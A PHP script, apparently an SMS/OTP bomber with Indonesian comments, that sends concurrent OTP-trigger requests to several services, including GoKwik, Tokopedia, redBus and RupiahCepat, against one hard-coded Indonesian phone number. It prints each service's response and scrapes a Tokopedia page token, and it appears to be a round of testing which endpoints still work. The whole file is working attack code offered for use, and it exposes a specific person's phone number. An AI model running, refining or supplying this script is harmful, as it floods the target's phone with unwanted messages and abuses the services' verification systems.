<?php
// Ronde 3: konfirmasi perbaikan + beberapa kandidat tambahan
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$P = '6283822461998'; $L = '083822461998'; $N = '83822461998';

$REQS = [
  ['name' => 'gokwik-FIX', 'm' => 'POST', 'url' => 'https://gkx.gokwik.co/v4/auth/otp/login/trigger',
   'h' => ['Content-Type: application/json', 'Accept: application/json', 'Origin: https://pdp.gokwik.co', 'Referer: https://pdp.gokwik.co/'],
   'b' => '{"phone":"' . $N . '","country":"ID","channel":"SMS"}'],

  ['name' => 'gokwik-FIX2', 'm' => 'POST', 'url' => 'https://gkx.gokwik.co/v4/auth/otp/login/trigger',
   'h' => ['Content-Type: application/json', 'Accept: application/json', 'x-app-channel: 101', 'x-app-version: 4.1.7', 'x-app-platform: ANDROID', 'Origin: https://pdp.gokwik.co', 'Referer: https://pdp.gokwik.co/'],
   'b' => '{"phone":"' . $N . '","country":"ID"}'],

  ['name' => 'jagreward', 'm' => 'GET', 'url' => 'https://id.jagreward.com/member/verify-mobile/' . $N . '/',
   'h' => ['Accept: application/json, text/plain, */*', 'X-Requested-With: XMLHttpRequest', 'Origin: https://id.jagreward.com', 'Referer: https://id.jagreward.com/member/register/'], 'b' => ''],

  ['name' => 'informasibumi', 'm' => 'POST', 'url' => 'https://www.informasibumi.com/login/requestOtp.php',
   'h' => ['Content-Type: application/x-www-form-urlencoded', 'Origin: https://www.informasibumi.com', 'Referer: https://www.informasibumi.com/login/'],
   'b' => 'phone=' . $L . '&device_id=bom' . rand()],

  ['name' => 'redbus-ulang', 'm' => 'GET', 'url' => 'https://m.redbus.id/api/getOtp?number=' . $N . '&cc=62&whatsAppOpted=True', 'h' => [], 'b' => ''],

  ['name' => 'rupiahcepat-ulang', 'm' => 'POST', 'url' => 'https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code',
   'h' => ['Content-Type: application/x-www-form-urlencoded; charset=UTF-8', 'Origin: https://h5.rupiahcepatweb.com', 'Referer: https://h5.rupiahcepatweb.com/'],
   'b' => 'data=' . urlencode(json_encode(['mobile' => $L, 'noise' => '1583590641573155574', 'request_time' => (string) (int) (microtime(true) * 1000), 'access_token' => '11111']))],

  ['name' => 'tokped-STEP1', 'm' => 'GET', 'url' => 'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=+' . $P . '&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister',
   'h' => ['Accept: text/html', 'Origin: https://accounts.tokopedia.com'], 'b' => '', 'follow' => true, 'cookie' => true],
];

$mh = curl_multi_init();
$cs = [];
foreach ($REQS as $i => $r) {
  $ch = curl_init();
  $hdrs = $r['h']; $hdrs[] = 'User-Agent: ' . $UA; $hdrs[] = 'Accept-Language: id';
  $opt = [CURLOPT_URL => $r['url'], CURLOPT_HTTPHEADER => $hdrs, CURLOPT_RETURNTRANSFER => true,
          CURLOPT_CONNECTTIMEOUT => 8, CURLOPT_TIMEOUT => 25, CURLOPT_FOLLOWLOCATION => !empty($r['follow']),
          CURLOPT_CUSTOMREQUEST => $r['m']];
  curl_setopt_array($ch, $opt);
  if (!empty($r['cookie'])) { $cj = tempnam(sys_get_temp_dir(), 'cj'); curl_setopt_array($ch, [CURLOPT_COOKIEJAR => $cj, CURLOPT_COOKIEFILE => $cj]); }
  if ($r['m'] !== 'GET') { curl_setopt($ch, CURLOPT_POSTFIELDS, $r['b']); }
  curl_multi_add_handle($mh, $ch);
  $cs[$i] = $ch;
}
$running = null; $errs = [];
do {
  curl_multi_exec($mh, $running);
  while (($info = curl_multi_info_read($mh)) !== false) {
    $idx = array_search($info['handle'], $cs, true);
    if ($info['result'] !== CURLE_OK) { $errs[$idx] = curl_strerror($info['result']); }
  }
  curl_multi_select($mh, 1.0);
} while ($running > 0);

foreach ($REQS as $i => $r) {
  $ch = $cs[$i];
  $resp = (string) curl_multi_getcontent($ch);
  $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  $body = $resp;
  echo "\n### " . $r['name'] . "  [HTTP " . ($code ?: '000') . "]\n";
  if (isset($errs[$i])) { echo "GAGAL: " . $errs[$i] . "\n"; continue; }
  $flat = trim(preg_replace('/\s+/', ' ', $body));
  echo (strlen($flat) > 340 ? substr($flat, 0, 340) . ' ...[potong]' : ($flat ?: '(body kosong)')) . "\n";
  if ($r['name'] === 'tokped-STEP1') {
    if (preg_match('/id="Token"\s+value="(.*?)"/', $body, $m)) {
      echo "TOKEN KETEMU: " . substr($m[1], 0, 40) . "...\n";
    } else { echo "TOKEN: tidak ketemu di halaman\n"; }
  }
  curl_multi_remove_handle($mh, $ch);
}
curl_multi_close($mh);
echo "\n";
